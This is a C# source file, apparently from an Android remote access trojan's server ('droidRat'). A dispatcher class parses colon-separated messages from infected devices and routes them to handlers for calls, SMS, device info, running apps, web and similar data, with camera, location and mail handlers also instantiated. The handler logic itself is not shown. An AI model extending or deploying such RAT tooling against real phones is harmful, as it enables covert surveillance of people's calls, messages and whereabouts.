using System;

namespace CSharp_droidRat_GUI_Server.Module.ProcessData.process_super
{
    public class DataProcess
    {
        private DataFather _dataFather;

        private CallData _callData;

        private CameraData _cameraData;

        private InfoData _infoData;

        private InstallData _installData;

        private LocationData _locationData;

        private MailData _mailData;

        private PlayData _playData;

        private RunAppData _runAppData;

        private SensorData _sensorData;

        private SMSData _smsData;

        private ToastData _toastData;

        private VibratorData _vibratorData;

        private WebData _webData;

        public DataProcess()
        {
            _callData = new CallData();
            _cameraData = new CameraData();
            _infoData = new InfoData();
            _installData = new InstallData();
            _locationData = new LocationData();
            _mailData = new MailData();
            _playData = new PlayData();
            _runAppData = new RunAppData();
            _sensorData = new SensorData();
            _smsData = new SMSData();
            _toastData = new ToastData();
            _vibratorData = new VibratorData();
            _webData = new WebData();
        }

        public void ProcessString(string dataString)
        {
            Console.WriteLine(@"Process String : " + dataString);
            var dataArray = dataString.Split(':');
            switch (dataArray[0])
            {
                case "Call":
                    _dataFather = _callData;
                    _dataFather.ProcessData(dataArray);
                    break;

                case "Info":
                    _dataFather = _infoData;
                    _dataFather.ProcessData(dataArray);
                    break;

                case "RunApp":
                    _dataFather = _runAppData;
                    _dataFather.ProcessData(dataArray);
                    break;

                case "SMS":
                    _dataFather = _smsData;
                    _dataFather.ProcessData(dataArray);
                    break;

                case "Toast":
                    _dataFather = _toastData;
                    _dataFather.ProcessData(dataArray);
                    break;

                case "Vibrator":
                    _dataFather = _vibratorData;
                    _dataFather.ProcessData(dataArray);
                    break;

                case "Web":
                    _dataFather = _webData;
                    _dataFather.ProcessData(dataArray);
                    break;

                default:
                    Console.WriteLine(@"Not Process String : " + dataString);
                    break;
            }
        }
    }
}